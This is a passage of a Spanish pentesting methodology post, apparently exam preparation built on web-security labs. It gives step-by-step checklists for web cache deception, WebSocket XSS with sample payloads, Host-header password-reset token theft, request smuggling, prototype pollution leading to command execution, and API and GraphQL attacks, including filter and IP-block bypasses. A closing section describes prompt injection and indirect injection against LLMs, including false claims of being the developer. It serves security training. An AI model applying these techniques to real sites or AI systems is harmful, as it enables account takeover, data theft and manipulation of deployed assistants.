Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar un web cache deception?

1 - `Instalar` la extensión `Param Miner` de `Burpsuite`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - `Crawleamos` el `dominio` con `Burpsuite` y `mientras termina el crawleo, exploramos todas las funciones de la web de forma manual`

4 - `Identificar` un `endpoint` con `información relevante`

5 - Podemos `activar` la `opción Add dynamic cachebuster` pulsando en `Param Miner > Settings > Add dynamic cacheubster`. Esto lo hacemos para que `cuando enviemos una petición nos añada un parámetro de consulta aleatorio y de esta forma, se cree una nueva clave caché con cada petición que enviemos`. `También podemos hacer este proceso manualmente añadiendo un cachebusgter a la petición que realicemos, por ejemplo http://example.com/?cachebuster=1`. Esto se hace para `asegurarnos de que no se carguen de la caché datos antiguos`. Para `comprobar` que `cargamos` los `datos` de la `caché`, `es importante desactivar la opción Add dynamic cachebuster en Param Miner`

6 - Una vez hayamos hecho lo anterior, `debemos revisar las técnicas vistas en los 4 laboratorios resueltos que se comparten en este post  y probarlas`. En mi caso me gusta `realizar` estos `ataques` de forma `manual`, sin embargo, podemos `usar las herramientas Cache Deception Scanner y wcDetect para agilizar el descubrimiento de estas vulnerabilidades`. Sin embargo, `debemos de tener en cuenta que Cache Deception Scanner y wcDetect solo detectan las 3 primeras vulnerabilidades vistas`. Por lo tanto, `es conveniente hacer los ataques manualmente`:

- Exploiting path mapping for web cache deception: [https://justice-reaper.github.io/posts/Web-Cache-Deception-Lab-1/](https://justice-reaper.github.io/posts/Web-Cache-Deception-Lab-1/)

- Exploiting path delimiters for web cache deception: [https://justice-reaper.github.io/posts/Web-Cache-Deception-Lab-2/](https://justice-reaper.github.io/posts/Web-Cache-Deception-Lab-2/)

- Exploiting origin server normalization for web cache deception: [https://justice-reaper.github.io/posts/Web-Cache-Deception-Lab-3/](https://justice-reaper.github.io/posts/Web-Cache-Deception-Lab-3/)

- Exploiting cache server normalization for web cache deception: [https://justice-reaper.github.io/posts/Web-Cache-Deception-Lab-4/](https://justice-reaper.github.io/posts/Web-Cache-Deception-Lab-4/)

## WebSocket attacks

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo llevar a cabo un ataque mediante WebSocket?

1 - Instalar las extensiones `Param Miner` y `Random IP Address Header` de `Burpsuite`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - `Crawleamos` el `dominio` con `Burpsuite` e `interactuamos manualmente con todas las funcionalidades del sitio web`

4 - Observar a ver si podemos enviar algún `payload` mediante un `message WebSocket`. Normalmente las `peticiones` se dan a través de un `live chat`. Lo que tenemos que hacer es `enviar` un `payload` como `<h1>test</h1>` para ver si podemos `inyectar HTML` y luego pasar a `inyectar` un `payload de XSS` como `<img src=x onerror=alert()>` o ``<img src=x onError=alert`3`>``. Puede ser que `veamos pasar varias peticiones con nuestro payload`, en ese caso tenemos que `coger todas las que veamos` y `enviarlas al Repeater`. Si vemos alguna `encodeada` o con `ciertos caracteres escapados`, la `borramos` y `pegamos nuestro payload sin el encoding y sin los escapes que se le han hecho del lado del cliente`. Puede ser que nos `bloqueen los payloads` porque estamos usando `ciertos caracteres no permitidos`, en ese caso lo que tenemos que hacer es `averiguar qué caracteres se pueden usar y cuáles no` para poder `crear un payload que bypasse estos controles`. Por último, `vemos el chat en el navegador para comprobar si han funcionado`. Si tenemos `dudas` con esto, es recomendable leer este `post` [https://justice-reaper.github.io/posts/WebSocket-Attacks-Lab-1/](https://justice-reaper.github.io/posts/WebSocket-Attacks-Lab-1/) y este otro [https://justice-reaper.github.io/posts/WebSocket-Attacks-Lab-2/](https://justice-reaper.github.io/posts/WebSocket-Attacks-Lab-2/)

5 - Si hemos `conseguido el XSS`, lo que tenemos que hacer ahora es `observar si el chat está vinculado a una cookie` y si `no existe token CSRF` podemos seguir los pasos que se siguen en este `laboratorio` [https://justice-reaper.github.io/posts/WebSocket-Attacks-Lab-2/](https://justice-reaper.github.io/posts/WebSocket-Attacks-Lab-2/) para conseguir `robarle la cookie al usuario víctima`

6 - Si al `enviar` el `payload` se nos `blacklistea la IP`, podemos usar la extensión `Param Miner` de `Burpsuite` para descubrir si podemos usar alguna `cabecera`, como `X-Forwarded-For`, para `bypassear` los `bloqueos de IP`. Una vez hemos `comprobado que esto funciona`, podemos usar la extensión `Random IP Address Header` para que nos `añada` esta `cabecera` a todas las `peticiones`. Si tenemos `dudas` con esto, es recomendable leer este `post` [https://justice-reaper.github.io/posts/WebSocket-Attacks-Lab-3/](https://justice-reaper.github.io/posts/WebSocket-Attacks-Lab-3/)

## HTTP Host header attacks

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar vulnerabilidades en la cabecera Host?

Teniendo en cuenta que `los términos y herramientas mencionados a continuación` se `encuentran` en la `cheatsheet mencionada anteriormente`, llevaremos a cabo los siguientes pasos:

1 - `Instalamos` las extensiones `Host Header Inchecktion` y `HTTP Request Smuggler` de `Burpsuite`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - `Crawleamos` el `dominio` con `Burpsuite` y `mientras termina el crawleo, exploramos todas las funciones de la web de forma manual`

4 - `Revisamos` el `código fuente` de la `web`, si vemos que `se refleja el dominio de la web en el código fuente podemos intentar llevar a cabo un web cache poisoning`. Para agilizar el proceso vamos a `lanzar la herramienta Web-Cache-Vulnerability-Scanner sobre los endpoints cuya respuesta se almacena en caché`. Si `existe` un `web caché poisoning` a `través` de la `cabecera Host`, `tenemos que seguir los mismos pasos que se hacen en este laboratorio` [https://justice-reaper.github.io/posts/HTTP-Host-Header-Attacks-Lab-3/](https://justice-reaper.github.io/posts/HTTP-Host-Header-Attacks-Lab-3/)

5 - Si en el `Exploit server` tenemos un `cliente de correo` y en el `login` de la `web` existe la opción `Forgot password?`, vamos a `pulsar sobre Forgot password?`, posteriormente `proporcionamos el nombre de usuario o email de la víctima` y `cambiamos el valor de la cabecera Host por el de nuestro Exploit server o por un dominio de Burpsuite Collaborator`. Esto lo hacemos para `obtener` el `token de reseteo de contraseña` que `viaja` en la `URL` y `es recomendable testear si funciona con nuestro usuario antes de ejecutarlo contra el usuario víctima`. Si tenemos alguna duda, `seguimos los pasos de este post` [https://justice-reaper.github.io/posts/HTTP-Host-Header-Attacks-Lab-1/](https://justice-reaper.github.io/posts/HTTP-Host-Header-Attacks-Lab-1/)

6 - `Fuzzeamos rutas con la herramienta ffuf y usamos common.txt de seclists como diccionario`. Si `encontramos` alguna `ruta interesante`, como `/admin`, vamos a `capturar` la `petición` a esa `ruta` y a `lanzar` la `extensión Host Header Inchecktion` de `Burpsuite`. Para esto último, haremos `click derecho > Extensions > Host Header Inchecktion > Collaborator payload`. Si tenemos alguna duda, `seguimos los pasos de este post` [https://justice-reaper.github.io/posts/HTTP-Host-Header-Attacks-Lab-2/](https://justice-reaper.github.io/posts/HTTP-Host-Header-Attacks-Lab-2/)

7 - `Lanzamos la extensión Host Header Inchecktion de Burpsuite sobre la raíz de la web`. Para ello, `pulsamos click derecho > Extensions > Host Header Inchecktion > Collaborator payload`. Si la `extensión` nos `detecta` un `SSRF` debemos de `testear todas las variantes que descubra y posteriormente de confirmar cuales son válidas`, vamos a `usar la herramienta ip-range-generator para generar un rango de IPs` y a `fuzzear desde el Intruder hasta dar con una IP interna que nos haga un redirect a /admin`. Si tenemos alguna duda, `seguimos los pasos de este post` [https://justice-reaper.github.io/posts/HTTP-Host-Header-Attacks-Lab-4/](https://justice-reaper.github.io/posts/HTTP-Host-Header-Attacks-Lab-4/) y si no dan resultado, `seguimos los de este otro post` [https://justice-reaper.github.io/posts/HTTP-Host-Header-Attacks-Lab-5/](https://justice-reaper.github.io/posts/HTTP-Host-Header-Attacks-Lab-5/)

8 - `Si en el paso anterior la extensión no ha detectado nada, vamos a lanzar la extensión HTTP Request Smuggler haciendo click derecho > Extensions > HTTP Request Smuggler > Connection-state`. Si nos `descubre` un `Connection state - input reflection`, lo que tenemos que hacer es `seguir los pasos que se ven en este post` [https://justice-reaper.github.io/posts/HTTP-Host-Header-Attacks-Lab-6/](https://justice-reaper.github.io/posts/HTTP-Host-Header-Attacks-Lab-6/). `Si no descubre nada, seleccionamosla opción Launch all scans para ver si encontramos algo`

## HTTP request smuggling

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar vulnerabilidades de HTTP request smuggling

Teniendo en cuenta que `los términos y herramientas mencionados a continuación` se `encuentran` en la `cheatsheet mencionada anteriormente`, llevaremos a cabo los siguientes pasos:

1 - `Instalar` las extensiones `HTTP Request Smuggler` y `Turbo Intruder`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`. En esta parte si `encontramos` un `XSS`, lo que debemos hacer es `usar el HTTP request smuggling para que la víctima ejecute el payload`

4 - `Para todos los ataques que vamos a ver a continuación a la hora que ejecutar las veririficaciones o los ataques es muy importante que enviemos muy rápido la segunda solicitud`. Además, `debemos de hacer esto varias veces para estar seguros`

5 - Lo más recomendable para esta `vulnerabilidad` es `ver todos los posts de HTTP request smuggling` y `replicarlos a la hora del examen uno a uno`

6 - Las `vulnerabilidades que se dan puramente mediante el protocolo HTTP/1.1` son `TE.CL` [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-4/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-4/) y `CL.TE` [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-3/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-3/) y `TE.TE` 

7 - La `vulnerabilidad CL.0` [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-15/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-15/)  también usa el `protocolo HTTP/1.1` pero la `metodología para encontrarla es diferente` así que la `pongo a parte`

8 - Las `vulnerabilidades que utilizan el protocolo HTTP/2 y que realizan downgrading` son `H2.TE` [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-12/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-12/) y `H2.CL` [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-11/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-11/)

9 - Puede que necesitemos `realizar una inyección CLRF` [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-14/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-14/), un `rewriting de la solicitud para obtener la cookie de la víctima` o `una cabecera que añada el servidor frontend y necesitemos obtener para realizar una solicitud a /admin` [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-8/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-8/), `ofuscar la cabecera Transfer-Encoding para convertir un TE.TE en un TE.CL o en un CL.TE` [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-5/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-5/), `llevar a cabo un response queue poisoning`, ya sea de la forma normal [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-12/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-12/) o mediante una `inyección CRLF` [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-14/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-14/) o `usar el HTTP request smuggling para ejecutar un XSS en el navegador de la víctima` [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-10/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-10/)

## Prototype pollution

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar un prototype pollution?

Teniendo en cuenta que `los términos y herramientas mencionados a continuación` se `encuentran` en la `cheatsheet mencionada anteriormente`, llevaremos a cabo los siguientes pasos:

1 - `Primero` nos vamos a `centrar` en `buscar` los `prototype pollution del lado del cliente`. Para ello, vamos a usar `DOM Invader`. `Podemos ver como se usa en este laboratorio` [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-5/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-5/)

2 - `Puede darse el caso de que pulsemos sobre Exploit en Dom Invader y que el exploit no funcione`. `Esto puede deberse a algo como lo que pasa en este laboratorio` [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-3/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-3/). `Si se da algo así, tendremos que inspeccionar el código JavaScript y ver que está pasando`

3 - `Para los prototype pollution del lado del servidor prefiero hacer todo el proceso de forma manual para evitar romper algo`. Lo primero que tenemos que hacer es `identificar si existe un prototype pollution con alguno de los métodos que aparecen en este laboratorio` [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-7/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-7/)

4 - `Si no funciona usando estos métodos puede ser porque se esté bloqueando __proto__ u otra cadena que estemos usando`. Para estos casos, `vamos a usar las formas alternativas que se ven en los laboratorios` [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-8/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-8/) y [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-3/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-3/)

5 - `Una vez ya funcione todo, nos tenemos que intentar convertir en usuario administrador`

6 - `Una vez lo hayamos hecho, vamos a seguir los pasos que se realizan en este laboratorio y vamos a ejecutar comandos en el servidor víctima` [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-9/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-9/)

## API testing

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar vulnerabilidades en APIs?

1 - `Instalar` las extensiones `GAP (Get All Parameters, Links, and Words)`, `Param Miner`, `Error Message Checks`, `Backslash Powered Scanner` y `Content Type Converter` de `Burpsuite`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - `Analizar` la `web` con el `escáner de Burpsuite`. Para ello, `marcaremos Crawl and audit` como `tipo de escaneo`  y como `configuración de escaneo` usaremos `Deep`. Mientras tanto, vamos a `loguearnos` si podemos, a `interactuar` con `todas` las `funcionalidades` de la `web` de `forma manual` y a `ver` las `peticiones` que se `realizan` desde el `Logger` para `ver` las `peticiones interesantes que hay`

4 - Si encontramos un `endpoint` de la `api`, `/api/swagger/v1/users/123` por ejemplo, `vamos` a `enviar` una `petición` por `GET` y por `POST` a las `rutas base`, para ver si `encontramos` la `documentación` de la `API`. Las `rutas base` para este `endpoint` en concreto son `/api/swagger/v1`, `/api/swagger` y `/api`

5 - `En el caso de que no encontremos ningún endpoint de la api o no encontremos la documentación, vamos a aplicar fuzzing con la herramienta Content discovery de Burpsuite`. `Como diccionario, vamos a usar el que nos viene por defecto`. `Antes de lanzar el ataque pulsamos en la pestaña config` y ponemos el `Numer of discovery threads` en `1` y el `Number of spider threads` a `1` también. El `objetivo` de esto es `encontrar` las `rutas base` de las `APIs` y su `documentación`

6 - Es `posible` que en los `siguiente pasos` tengamos que `cambiar` el `Content-Type` y el `formato` en el que se `envían` los `datos` para que `la petición se envíe correctamente`. Para `facilitar` esto, podemos `usar` la `extensión Content Type Converter de Burpsuite`

7 - Si `encontramos` la `documentación`, debemos `analizar que peticiones podemos realizar` y `ver si hay alguna que nos permita realizar alguna acción interesante`

8 - Hay ocasiones en las que hay `funcionalidades` de los `endpoints` que `no están en la documentación`. `Por lo que, tanto si hemos encontrado documentación como si no`, tenemos que `identificar que endpoints de los que hemos encontrado son interesantes` y desde el `Intruder` procedemos a `efectuar` un `ataque de tipo Sniper` para `descubrir que métodos soportan estos endpoints`, como `diccionario` podemos usar `HTTP verbs`, el cual viene con `Burpsuite` por defecto u `otro diccionario que tenga más métodos HTTP`. `Tenemos que fijarnos bien si existe algún endpoint que podamos usar para realizar alguna acción interesante`

9 - `En el caso de que no podamos realizar ninguna acción interesante`, vamos a `probar` a `efectuar` un `mass assignment attack`. Para esto, `nos vamos a fijar en los campos que se ven en las respuestas que devuelve el servidor al enviarle peticiones a los diferentes endpoints, ya que es posible que podamos añadir uno de esos campos a una petición y así modificar campos del objeto que no debería de ser modificables`. También podemos `usar` la `extensión Param Miner de Burpsuite` para `descubrir nuevos parámetros`. `Para ver si ha encontrado algún parámetro nuevo, lo podemos hacer desde Extensions > Param Miner > Output` o `analizar` nosotros mismos las `peticiones` desde el `Logger`. Al `usar` esta `extensión`, hay veces que `el servidor no identifica correctamente la URL porque se le añade esto ?adfer32xa`. Para `solucionar` esto, `debemos desactivar la opción include query-param in cachebusters antes de lanzar el ataque`. También es recomendable `activar` la opción `learn observed words`

10 - `Si el mass assignment attack no da resultado`, vamos a `intentar llevar a cabo un parameter pollution`. `Si la extensión Backslash Powered Scanner nos ha reportado que existe algún tipo de inyección`, es `probable` que la `web` sea `vulnerable` a `parameter pollution`. Una vez descubierto esto, `seguimos los pasos que se hacen en este post` [https://justice-reaper.github.io/posts/API-Testing-Lab-2/](https://justice-reaper.github.io/posts/API-Testing-Lab-2/). `Si tenemos alguna duda sobre los pasos que se hacen en el laboratorio mencionado, podemos leer este apartado en el que se enseña como identificar un parameter pollution` [https://justice-reaper.github.io/posts/Api-Testing-Guide/#server-side-parameter-pollution](https://justice-reaper.github.io/posts/Api-Testing-Guide/#server-side-parameter-pollution). Otra cosa importante, en el `post` lo que hacemos para `ver` que `valor proporcionar` es `leer` un `archivo JS`, `esto nos lo podemos ahorrar usando la extensión GAP (Get All Parameters, Links, and Words) para obtener un diccionario o también podemos usar el diccionario Server-side variable names que viene por defecto en Burpsuite`, el `siguiente paso` sería `usar` el `Intruder` para `ejecutar` un `ataque de fuerza bruta`. `Para lo que sí que necesitamos mirar los archivos JS es para ver las rutas`

## Vulnerabilidades de la API de GraphQL

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar vulnerabilidades de la api de GraphQL?

1 - `Instalar` las extensiones `InQL` y `Content Type Converter` de `Burpsuite`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - Nos `logueamos` si es posible, `interactuamos manualmente` con todas las `funcionalidades` del sitio web y `crawleamos` el `dominio` con `Burpsuite`

4 - `Buscamos` `endpoints de GraphQL` en el `HTTP history` y en el `Site map`

5 - Si no hay `endpoints` vamos a `fuzzear` con el `diccionario` `common.txt` de `seclists`. Es importante `fuzzear` primero usando el `método POST` y luego usando el `método GET`

6 - Una vez descubierto el `endpoint de GraphQL`, tenemos que ver si a ese `endpoint` hay que `enviarle los datos` por `POST` o por `GET`. Para confirmar esto, vamos a usar esta `expresión` si la `petición` va por `GET`

```
https://api/?query={__typename}
```

Y para `enviar los datos` por `POST` usamos esta `cabecera` `Content-Type: application/json` y enviamos esta `data` en el `body`

```
{"query":"{__typename}"}
```

Además de `JSON` también debemos probar a `enviar` la `query` en formato `urlencoded`. Esta sería la versión `urlencodeada` que se usuaría para `enviar datos` tanto por `GET` como por `POST`

```
query=%7B__typename%7D
```

Quedaría así al usarlo en una `petición GET`

```
https://api/?query=%7B__typename%7D
```

Y así al usarlo en una `petición POST`

```
query=%7B__typename%7D
```

7 - Una vez hecho esto lo que vamos a hacer es en la `pestaña de GraphQL` que aparece en el `Repeater` hacer `click derecho sobre la petición > GraphQL > Set introspection query`. En caso de que el `servidor` `bloquee` la `petición` y nos muestre un `error` de este estilo `"GraphQL introspection is not allowed, but the query contained __schema or __type"`, vamos a añadir un `salto de línea`, `comas` o `espacios` después de `__schema` para `bypassear` la posible `sanitización` que se esté empleando. Es seguro usar estos `caracteres` porque `GraphQL` los `ignora`, pero las `expresiones regulares que puede haber implementado los desarolladores no`

8 - Una vez hecha la `consulta de introspección` vamos a hacer `click derecho sobre la respuesta > GraphQL > Save GraphQL queries to site map`

9 - Ahora lo que vamos a hacer es `diriginos` al `Site map` e `inspeccionar` todas las `queries de GraphQL` y vamos a `listar informaicón privilegiada` a través de estas `queries`. También puede ser que podamos `realizar acciones` a través de las `mutations`. Para `visualizar` de una mejor forma las `queries` vamos a hacer `click derecho la respuesta > Extensions > InQL - GraphQL Scanner > Open in GraphQL Voyager`

10 - Si queremos asegurarnos de `recopilar toda la información posible` podemos utilizar `InQL`. Lo que tenemos que hacer es `click derecho > Extensions > InQL - GraphQL Scanner > Generate queries` o `importar` en `formato JSON` el `schema de GraphQL` que hemos `obtenido` al `realizar` la `introspección`

13 - `Si no encontramos nada interesante`, vamos a intentar `realizar` un `ataque de fuerza bruta` al `login` usando `alias`. Para ello, vamos a `seguir los pasos que se hacen en este laboratorio` [https://justice-reaper.github.io/posts/GraphQL-API-Vulnerabilities-Lab-4/](https://justice-reaper.github.io/posts/GraphQL-API-Vulnerabilities-Lab-4/)

14 - En el caso de poder `cambiar nuestro email` o `asociar nuestra cuenta con un email`, `podemos ver si se realiza mediante GraphQL` y `checkear si tiene o no un token CSRF`. `Si no tiene token CSRF, podemos intentar llevar a cabo un ataque CSRF mediante GraphQL`. Si nos `surge` alguna `duda`, es recomendable `seguir los pasos que se hacen en este laboratorio` [https://justice-reaper.github.io/posts/GraphQL-API-Vulnerabilities-Lab-5/](https://justice-reaper.github.io/posts/GraphQL-API-Vulnerabilities-Lab-5/)

## Web LLM attacks

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo atacar un LLM?

1 - `Preguntar directamente al LLM qué APIs y plugins puede usar`

2 - `Solicitar los detalles de cada API/función, en concreto sus parámetros de entrada (input) y su valor de retorno (output)`, ya que son los que nos permitirán `construir el ataque`

3 - `Si el LLM no coopera, probar a proporcionar un contexto engañoso`, por ejemplo, `afirmar que somos su desarrollador para simular un mayor nivel de privilegio`

4 - `Si no conseguimos obtener la información que queremos a través de un prompt injection convencional, vamos a tratar de hacerlo mediante un indirect prompt injection`. Para realizar esto hay `técnicas` muy `variadas`, pero `el objetivo es siempre el mismo`, `hacerle llegar la consulta que queremos al LLM de una forma diferente a la convencional`. Por ejemplo, podemos `subir una foto con un comentario en los metadatos, hacer un comentario indicándole las instrucciones a seguir, pasarle un artículo escrito por nosotros en una web externa etc`

5 - También podemos intentar `explotar vulnerabilidades convencionales a través del LLM`, como un `SSRF`, `command injection`, `XSS`, `etc`

6 - Si tenemos `dudas` con los `pasos anteriores` podemos `consultar` estos `posts`:

- Exploiting LLM APIs with excessive agency: [https://justice-reaper.github.io/posts/Web-LLM-Attacks-Lab-1/](https://justice-reaper.github.io/posts/Web-LLM-Attacks-Lab-1/)

- Exploiting vulnerabilities in LLM APIs: [https://justice-reaper.github.io/posts/Web-LLM-Attacks-Lab-2/](https://justice-reaper.github.io/posts/Web-LLM-Attacks-Lab-2/)

- Indirect prompt injection: [https://justice-reaper.github.io/posts/Web-LLM-Attacks-Lab-3/](https://justice-reaper.github.io/posts/Web-LLM-Attacks-Lab-3/)

